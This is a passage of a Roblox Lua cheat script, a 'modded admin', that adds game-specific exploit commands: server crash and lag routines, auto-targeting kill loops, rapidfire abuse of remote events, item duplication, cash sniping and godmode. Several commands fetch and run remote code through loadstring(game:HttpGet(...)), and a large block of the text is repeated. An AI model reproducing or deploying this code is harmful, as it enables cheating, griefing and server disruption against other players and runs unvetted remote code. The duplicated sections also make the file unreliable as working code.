  player.Character.HumanoidRootPart.CFrame = adminbaseCoords
elseif location == "park" then  -- Add this block to handle the "park" location
  player.Character.HumanoidRootPart.CFrame = parkCoords
else
  print("Invalid location specified")
end
end)

    AddCommand("nocashsniper", {"*nocashsniper", "stopsnipe"}, "stops sniping", {}, function()
        getgenv().enablesniping = false
return "Cash sniping disabled"
    end)
    
    AddCommand("revenge", {"*revenge"}, "gets revenge on whoever stomped a player of your choice", {}, function(Caller, Args)
    getgenv().revengemode = true
    local revenged = Args[1]
while getgenv().revengemode do
    wait(0.1)
if game:GetService("Workspace")[revenged].CharacterDied.Value == true then
    local killer = game:GetService("Workspace")[revenged].KilledBy.Value
    print("target player died, " ..killer.. " killed them")
    print(killer)
    ExecuteCommand("kill", {killer}, LocalPlayer)
    wait(11)
    else
        print("target player alive")
end
end
end)

AddCommand("unrevenge", {"*unrevenge"}, "stomps avenging players", {}, function(Caller, Args)
    getgenv().revengemode = false
end)

    AddCommand("autoarmor", {"*autoarmor"}, "autobuys armor if below a threshold", {}, function()
        getgenv().autoarmor = true
        while getgenv().autoarmor do
            wait(0.01)
if game:GetService("Players").LocalPlayer.Armor.Value < 49 then
fireclickdetector(game:GetService("Workspace")["Higher armor {20000$}"].Head.ClickDetector)
end
end
    end)
    
    AddCommand("unautoarmor", {"*unautoarmor"}, "stops buying armor", {}, function()
        getgenv().autoarmor = false
    end)
    
    AddCommand("cashdropper", {"*cashdropper"}, "cashdropper gui", {}, function()
        local screenGui = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local textBox = Instance.new("TextBox")
local button1 = Instance.new("TextButton")
local button2 = Instance.new("TextButton")

screenGui.Name = "CashDropper"
screenGui.Parent = game.Players.LocalPlayer.PlayerGui

frame.Name = "CashDropperFrame"
frame.Parent = screenGui
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.Position = UDim2.new(0, 250, 0, 250) -- position the frame near the middle left of the screen
frame.Size = UDim2.new(0, 200, 0, 200)

textBox.Name = "AmountTextBox"
textBox.Parent = frame
textBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
textBox.Position = UDim2.new(0, 10, 0, 10)
textBox.Size = UDim2.new(0, 180, 0, 30)
textBox.Text = "Enter amount"

button1.Name = "NotificationButton"
button1.Parent = frame
button1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
button1.Position = UDim2.new(0, 10, 0, 50)
button1.Size = UDim2.new(0, 180, 0, 30)
button1.Text = "Send notification"

button2.Name = "DropCashButton"
button2.Parent = frame
button2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
button2.Position = UDim2.new(0, 10, 0, 90)
button2.Size = UDim2.new(0, 180, 0, 30)
button2.Text = "Drop cash"

-- Button 1 script
button1.MouseButton1Click:Connect(function()
   local amount = tonumber(textBox.Text)
   local neededAmount = amount / 0.7 -- accounting for the 30% deduction
   game.StarterGui:SetCore("SendNotification", {
      Title = "Amount needed";
      Text = "You need to drop $" .. neededAmount .. " to get $" .. amount;
   })
end)

-- Button 2 script
button2.MouseButton1Click:Connect(function()
   local amount = tonumber(textBox.Text)
   local neededAmount = amount / 0.7 -- accounting for the 30% deduction
   local event = game:GetService("ReplicatedStorage").WalletRemotes.DropCash
   event:FireServer(neededAmount)
end)
    end)
    
    local player = game.Players.LocalPlayer

player.Chatted:Connect(function(message)
    if message:lower() == "shazam!" then
        local A_1 = "wear"
local A_2 = 2691814355
local Event = game:GetService("ReplicatedStorage").UpdateAvatar
Event:FireServer(A_1, A_2)
local A_1 = "wear"
local A_2 = 144055148
local Event = game:GetService("ReplicatedStorage").UpdateAvatar
Event:FireServer(A_1, A_2)
end
end)
    
local player = game.Players.LocalPlayer
local Event = game:GetService("ReplicatedStorage").UpdateAvatar
player.Chatted:Connect(function(message)
    if message:lower() == "im vengeance" then
        local A_1 = "wear"
local A_2 = 3049284724
Event:FireServer(A_1, A_2)
local A_1 = "wear"
local A_2 = 3049285265
Event:FireServer(A_1, A_2)
local A_1 = "wear"
local A_2 = 10647971081
Event:FireServer(A_1, A_2)
    end
end)

print("Da hood battles grounds detected")
    Utils.Notify(LocalPlayer, "Compatible game detected", "DHB is supported for extra commands! Type a * in the cmds menu to view them", 10);
end

--DV HOOD
if game.PlaceId == 9431306429 then   
AddCommand("crash", {"*crash"}, "crashes the game, prepcrash command must be used first", {}, function()
       game:GetService'Players'.LocalPlayer.Character['RightHand']:Destroy()
wait(0.001)
game:GetService'Players'.LocalPlayer.Character['RightLowerArm']:Destroy()
wait(0.001)
game:GetService'Players'.LocalPlayer.Character['RightUpperArm']:Destroy()
wait(3)
game:GetService'Players'.LocalPlayer.Character['Head']:Destroy()
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("crash/lag attempted","All")
    return "crash attempted"
end)

AddCommand("mgtool", {"*mgtool"}, "uses all moneyguns in your inventory, use buymg (amount) to get some", {}, function()
       local player = game.Players.LocalPlayer
local character = player.Character
local mouse = player:GetMouse()

local tool = Instance.new("Tool")
tool.Name = "Megamoneygun"
tool.Parent = player.Backpack

function onClick()
  for _,obj in next, game.Players.LocalPlayer.Backpack:GetChildren() do
if obj.Name == "MoneyGun" then
local equip = game.Players.LocalPlayer.Backpack.MoneyGun
equip.Parent = game.Players.LocalPlayer.Character
end
end
wait(0.3)
for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren())do
if v.ClassName == "Tool" then
v:Activate()
end
end
end


mouse.Button1Down:Connect(function()
  if tool.Parent == character then
    -- The tool is being held
    onClick()
  else
    -- The tool is not being held
  end
end)
    end)
    
AddCommand("prepcrash", {"*prepcrash"}, "prepares to crash the game, once ready you can type crash in the command bar to crash", {}, function()
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-761, 185, 267)
for i = 1,30 do
    wait(0.2)
for i,v in pairs(game:GetDescendants()) do
      if v:IsA("ClickDetector") then
          fireclickdetector(v)
      end
end
end
wait(0.5)
for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
v.Parent = game.Players.LocalPlayer.Character
end
return("Crash ready! Type !crash to finish the job")
    end)

AddCommand("protect", {"*protect", "guard"}, "lasers players within a radius of protected player", {1,"1"}, function(Caller, Args, CEnv)
for _,obj in next, game.Players.LocalPlayer.Backpack:GetChildren() do
if obj.Name == "Revolver" then
local equip = game.Players.LocalPlayer.Backpack.Revolver
equip.Parent = game.Players.LocalPlayer.Character
end
end
local targetPlayerName = Args[1]

print(targetPlayerName)
local targetPlayerChar = nil
for _, player in pairs(game.Players:GetPlayers()) do
  if player.Name == targetPlayerName then
    targetPlayerChar = player.Character
    break
  end
end

-- If the target player was not found, display an error message
if not targetPlayerChar then
  return "full username required"
end

-- Get the local player's character
local localPlayerChar = game.Players.LocalPlayer.Character

-- Create a function to get and print the coordinates
local function getCoords()
  -- Get the target player's coordinates
  local targetPlayerCoords = targetPlayerChar.HumanoidRootPart.Position

  -- Find the closest player to the target player
  local closestPlayer = nil
  local closestDistance = math.huge
  for _, player in pairs(game.Players:GetPlayers()) do
    if player.Name ~= targetPlayerName and player ~= game.Players.LocalPlayer then
      -- Get the player's coordinates
      local playerCoords = player.Character.HumanoidRootPart.Position

      -- Calculate the distance between the target player and the player
      local distance = (playerCoords - targetPlayerCoords).Magnitude

      -- If the distance is less than the current closest distance, update the closest player and distance
      if distance < closestDistance then
        closestPlayer = player
        closestDistance = distance
      end
    end
  end

  -- If the closest player is within 20 units of the target player, fire the gun at them
  if closestPlayer and closestDistance <= 20 then
    local reloadEvent = game:GetService("ReplicatedStorage").ReloadWeapon
    local coords = closestPlayer.Character.HumanoidRootPart.Position
    local NewX = coords.X
    local NewY = coords.Y
    local NewZ = coords.Z
    local final = Vector3.new(NewX, NewY, NewZ)
    local A_1 = Vector3.new(1 * NewX, 1 * NewY, 1 * NewZ)
    local A_2 = localPlayerChar:WaitForChild("Revolver")
    local Event = game:GetService("ReplicatedStorage").ToolRemoteEvents.Rev
    Event:FireServer(A_1, A_2)
    reloadEvent:FireServer()
    print(final)
  end
end

-- Create a loop that runs the function every 1 second
while true do
  getCoords()
  wait(0.005)
end
end)

AddCommand("semigod", {"*semigod"}, "Enables a pretty good godmode", {}, function()
game.Players.LocalPlayer.Character.Ragdolled:Destroy()
getgenv().Godmode = true
game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(Character)
if getgenv().Godmode then
    wait(2)
    game.Players.LocalPlayer.Character.Ragdolled:Destroy()
end
end)
return "enabled! (only weakness is a punch at low health)"
end)

AddCommand("jail", {"*jail"}, "tps user to jail", {1,"1"}, function(Caller, Args)
    local Target = GetPlayer(Args[1]);
    local OldPos = GetRoot(LocalPlayer).CFrame
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(76, 124, 341)
wait(0.2)
    ExecuteCommand("bring", {Args[1]}, LocalPlayer)
    wait(.5);
        WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
end)

 AddCommand("ungod", {"*ungod"}, "disables semigod", {}, function()
        getgenv().Godmode = false
	return "god mode disabled. reset for it to take effect"
 end)
    
    AddCommand("rapidfire", {"*rapidfire"}, "autobuys armor if below a threshold", {}, function()
    if not game:IsLoaded() then 
   game.Loaded:Wait();
end

local players, replicatedStorage, runService, userInputService = game:GetService("Players"), game:GetService("ReplicatedStorage"), game:GetService("RunService"), game:GetService("UserInputService");
local client, mouse = players.LocalPlayer, players.LocalPlayer:GetMouse();

local toolRemoteEvents = replicatedStorage:FindFirstChild("ToolRemoteEvents");
local reloadWeapon = replicatedStorage:FindFirstChild("ReloadWeapon");

local keyHeld = false

userInputService.InputBegan:Connect(function(key)
   if userInputService:GetFocusedTextBox() then return end 

   if key.KeyCode == Enum.KeyCode.E then 
       keyHeld = true
   end
end);

userInputService.InputEnded:Connect(function(key)
   if userInputService:GetFocusedTextBox() then return end 

   if key.KeyCode == Enum.KeyCode.E then 
       keyHeld = false
   end
end);

runService.RenderStepped:Connect(function()
   if keyHeld == true then 
       if client.Character and client.Character:FindFirstChildOfClass("Tool") then
           local tool = client.Character:FindFirstChildOfClass("Tool");

           toolRemoteEvents[((tool.Name ~= "Revolver" and tool.Name) or "Rev")]:FireServer(mouse.Hit.Position, tool);
           reloadWeapon:FireServer();
       end
   end
end);
return "enabled! hold e to fire quick with weapon in hand"
    end)
    
    AddCommand("cashsniper", {"*cashsniper"}, "snipes all cash detected in the workspace", {}, function()
getgenv().enablesniping = true

function scanWorkspace()
  if not getgenv().enablesniping then
    return
  end
  
  local money = workspace:FindFirstChild("Money")
  local moneyDrop = workspace:FindFirstChild("MoneyDrop")

  if money then
    fireclickdetector(money.ClickDetector)
  end
  
  if moneyDrop then
    fireclickdetector(moneyDrop.ClickDetector)  
end
end

while true do
  scanWorkspace()
  wait(0.1)
end
return "Cash sniping enabled"
    end)
    
    AddCommand("maptp", {"*maptp"}, "Teleports you to a landmark in the map", {{"casino", "school", "park", "park2", "gunstore1", "gunstore2"}}, function(Caller, Args)
local location = (Args[1])

-- Coordinates for each location
local gunstore1Coords = CFrame.new(-376, 144, 220)
local gunstore2Coords = CFrame.new(348, 124, -239)
local schoolCoords = CFrame.new(-821, 171, 30)
local parkCoords = CFrame.new(-209, 141, 47)
local park2Coords = CFrame.new(-79, 143, -457)
local casinoCoords = CFrame.new(-220, 143, -330)
-- Teleport the player to the specified location
local player = game.Players.LocalPlayer
if location == "gunstore1" then
  player.Character.HumanoidRootPart.CFrame = gunstore1Coords
elseif location == "gunstore2" then
  player.Character.HumanoidRootPart.CFrame = gunstore2Coords
elseif location == "school" then
  player.Character.HumanoidRootPart.CFrame = schoolCoords
  elseif location == "park2" then
  player.Character.HumanoidRootPart.CFrame = park2Coords
  elseif location == "casino" then
  player.Character.HumanoidRootPart.CFrame = casinoCoords
elseif location == "park" then  -- Add this block to handle the "park" location
  player.Character.HumanoidRootPart.CFrame = parkCoords
else
  print("Invalid location specified")
end
end)

    AddCommand("nocashsniper", {"*nocashsniper", "stopsnipe"}, "stops sniping", {}, function()
        getgenv().enablesniping = false
return "Cash sniping disabled"
    end)
    
    AddCommand("revenge", {"*revenge"}, "gets revenge on whoever stomped a player of your choice", {}, function(Caller, Args)
    getgenv().revengemode = true
    local revenged = Args[1]
while getgenv().revengemode do
    wait(0.1)
if game:GetService("Workspace")[revenged].CharacterDied.Value == true then
    local killer = game:GetService("Workspace")[revenged].KilledBy.Value
    print("target player died, " ..killer.. " killed them")
    print(killer)
    ExecuteCommand("kill", {killer}, LocalPlayer)
    wait(11)
    else
        print("target player alive")
end
end
end)

AddCommand("unrevenge", {"*unrevenge"}, "stomps avenging players", {}, function(Caller, Args)
    getgenv().revengemode = false
end)

    AddCommand("autoarmor", {"*autoarmor"}, "autobuys armor if below a threshold", {}, function()
        getgenv().autoarmor = true
        while getgenv().autoarmor do
            wait(0.01)
if game:GetService("Players").LocalPlayer.Armor.Value < 49 then
fireclickdetector(game:GetService("Workspace")["Higher armor {20000$}"].Head.ClickDetector)
end
end
    end)
    
    AddCommand("unautoarmor", {"*unautoarmor"}, "stops buying armor", {}, function()
        getgenv().autoarmor = false
    end)
    
    AddCommand("cashdropper", {"*cashdropper"}, "cashdropper gui", {}, function()
        local screenGui = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local textBox = Instance.new("TextBox")
local button1 = Instance.new("TextButton")
local button2 = Instance.new("TextButton")

screenGui.Name = "CashDropper"
screenGui.Parent = game.Players.LocalPlayer.PlayerGui

frame.Name = "CashDropperFrame"
frame.Parent = screenGui
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.Position = UDim2.new(0, 250, 0, 250) -- position the frame near the middle left of the screen
frame.Size = UDim2.new(0, 200, 0, 200)

textBox.Name = "AmountTextBox"
textBox.Parent = frame
textBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
textBox.Position = UDim2.new(0, 10, 0, 10)
textBox.Size = UDim2.new(0, 180, 0, 30)
textBox.Text = "Enter amount"

button1.Name = "NotificationButton"
button1.Parent = frame
button1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
button1.Position = UDim2.new(0, 10, 0, 50)
button1.Size = UDim2.new(0, 180, 0, 30)
button1.Text = "Send notification"

button2.Name = "DropCashButton"
button2.Parent = frame
button2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
button2.Position = UDim2.new(0, 10, 0, 90)
button2.Size = UDim2.new(0, 180, 0, 30)
button2.Text = "Drop cash"

-- Button 1 script
button1.MouseButton1Click:Connect(function()
   local amount = tonumber(textBox.Text)
   local neededAmount = amount / 0.7 -- accounting for the 30% deduction
   game.StarterGui:SetCore("SendNotification", {
      Title = "Amount needed";
      Text = "You need to drop $" .. neededAmount .. " to get $" .. amount;
   })
end)

-- Button 2 script
button2.MouseButton1Click:Connect(function()
   local amount = tonumber(textBox.Text)
   local neededAmount = amount / 0.7 -- accounting for the 30% deduction
   local event = game:GetService("ReplicatedStorage").WalletRemotes.DropCash
   event:FireServer(neededAmount)
end)
    end)

print("DV hood detected")
    Utils.Notify(LocalPlayer, "Compatible game detected", "DVH is supported for extra commands! Type a * in the cmds menu to view them", 10);
end

if game.PlaceId == 6708206173 then
    AddCommand("getknight", {"*getknight"}, "teleports to knight (if available)", {}, function()
    local hrp = game.Players.LocalPlayer.Character.HumanoidRootPart
local gobackto = hrp.CFrame
local target = game:GetService("Workspace").JewelleryStand
if target.Transparency ~= 1 then
hrp.CFrame = CFrame.new(target.Position)
wait(0.4)
fireproximityprompt(target.ProximityPrompt)
wait()
hrp.CFrame = gobackto
end
end)

AddCommand("respawntool", {"*respawntool"}, "gives you a tool upon respawn", {{"image", "text", "stopsign", "sword"}}, function(Caller, Args)
local respawnwith = (Args[1])
-- Teleport the player to the specified location
local player = game.Players.LocalPlayer
if respawnwith == "stopsign" then
    game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(Character)
    wait(0.2)
local A_1 = 17290248
local Event = game:GetService("ReplicatedStorage").RequestGamepassTool
Event:FireServer(A_1)
end)

elseif respawnwith == "sword" then
  game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(Character)
      wait(0.2)
local A_1 = "ClassicSword"
local Event = game:GetService("ReplicatedStorage").RequestTool
Event:FireServer(A_1) 
end)
elseif respawnwith == "text" then
    game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(Character)
    wait(0.2)
local A_1 = 17291420
local Event = game:GetService("ReplicatedStorage").RequestGamepassTool
Event:FireServer(A_1)
end)

elseif respawnwith == "image" then
   game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(Character)
       wait(0.2)
local A_1 = 17291427
local Event = game:GetService("ReplicatedStorage").RequestGamepassTool
Event:FireServer(A_1)
end)
else
  print("tool not found")
end
end)

AddCommand("loopgivesword", {"*loopgivesword"}, "loop duplicates swords", {}, function(Caller, Args)
getgenv().sworddupe = true
while getgenv().sworddupe do
local args = {
    	[1] = "ClassicSword",
		}
		game:GetService("ReplicatedStorage").RequestTool:FireServer(unpack(args))
		wait(0.05)
		for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
v.Parent = game.Players.LocalPlayer.Character
end
end
end)

AddCommand("boothupdate", {"*boothupdate"}, "sets the text and/or of ur booth", {}, function(Caller, Args)
local A_1 = "Update"
local A_2 =  {
	["DescriptionText"] = Args[1], 
	["ImageId"] = Args[2] or 0
}
local Event = game:GetService("ReplicatedStorage").CustomiseBooth
Event:FireServer(A_1, A_2)
end)

AddCommand("crash", {"*crash", "serverlag"}, "lots of swords needed to crash", {}, function(Caller, Args)
for _,obj in next, game.Players.LocalPlayer.Backpack:GetChildren() do
if obj.Name == "ClassicSword" then
local equip = game.Players.LocalPlayer.Backpack.ClassicSword
equip.Parent = game.Players.LocalPlayer.Character
end
end
wait(2)
game:GetService'Players'.LocalPlayer.Character['RightHand']:Destroy()
wait(0.001)
game:GetService'Players'.LocalPlayer.Character['RightLowerArm']:Destroy()
wait(0.001)
game:GetService'Players'.LocalPlayer.Character['RightUpperArm']:Destroy()
wait(3)
game:GetService'Players'.LocalPlayer.Character['Head']:Destroy()
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("crash/lag attempted","All")
    return "crash attempted, if nothing happened you need swords dummy"
end)

AddCommand("rate", {"*rate"}, "!rate (player) (stars)", {}, function(Caller, Args)
local Target = Args[1]
local A_1 = game:GetService("Players")[Args[1]]
local A_2 = Args[2]
local Event = game:GetService("ReplicatedStorage").PostRating
Event:FireServer(A_1, A_2)
end)

AddCommand("unloopgivesword", {"*unloopgivesword"}, "stops duping swords", {}, function(Caller, Args)
getgenv().sworddupe = false
end)

--Github imports
AddCommand("sus", {"*sus"}, "AMOGUS", {}, function(Caller, Args)
loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/scripts/main/sus.lua"))()
end)
AddCommand("rickroll", {"*rickroll"}, "never gonna give you up never gonna let you downnn", {}, function(Caller, Args)
loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/scripts/main/rickroll.Lua"))()
end)

AddCommand("boothchat", {"*boothchat"}, "display a live chat on ur booth", {}, function(Caller, Args)
loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/scripts/main/rate_my_avatar_public_chat.lua"))()
end)

AddCommand("snake", {"*snake"}, "lets you play snake with ur booth", {}, function(Caller, Args)
loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/scripts/main/WORM!!_2D_RatemyAvatarSnakeGame.lua"))()
end)

AddCommand("pong", {"*pong"}, "wow", {}, function(Caller, Args)
loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/scripts/main/RateMyAvatarPong.Lua"))()
end)

AddCommand("paint", {"*paint"}, "paint with ur booth", {}, function(Caller, Args)
loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/scripts/main/RateMyAvatar_MS_Paint.lua"))()
end)

AddCommand("antiblacklist", {"*antiblacklist"}, "cool", {}, function(Caller, Args)
--stupidly simple
while task.wait() do
    for i,v in pairs(Workspace:GetDescendants()) do
        if v.Name:match("Barrier") then v:Destroy() end
    end
end
end)
Utils.Notify(LocalPlayer, "Compatible game detected", "Rate my avatar is supported for extra commands! Type a * in the cmds menu to view them", 10);
end

-- Get a reference to the Workspace service
local workspace = game:GetService("Workspace")

-- Define a list of the target usernames
local targetUsernames = {"segclord", "Arovlias"}

-- Create a table to store the players that have already been given a crown
local crownedPlayers = {}

-- Create a function that will be called every frame to check the players
local function checkPlayers()
  -- Use a loop to check all of the players in the game
  for _, player in pairs(game.Players:GetPlayers()) do
    -- Check if the player's username is in the targetUsernames list and if they have already been given a crown
    if table.find(targetUsernames, player.Name) and not crownedPlayers[player] then
      -- If it is, add the crown emoji to the beginning of their display name
      player.Character.Humanoid.DisplayName = "(👑) " .. player.Character.Humanoid.DisplayName
      
      -- Add the player to the crownedPlayers table to mark them as having been given a crown
      crownedPlayers[player] = true
    end
  end
end

-- Connect the checkPlayers function to the RenderStepped event
game:GetService("RunService").RenderStepped:Connect(checkPlayers)


Utils.Notify(LocalPlayer, "Modded Version", "You are using a modded admin by Advid#1471", 10);
Utils.Notify(LocalPlayer, "Loaded", format("script loaded in %.3f seconds", (tick()) - _L.start));
Utils.Notify(LocalPlayer, "Welcome", "'cmds' to see all of the commands, 'config' to customise the script");
if (debug.info(2, "f") == nil) then
    Utils.Notify(LocalPlayer, "Possibly outdated", "Use a loadstring with the github link for latest updates", 10);
end
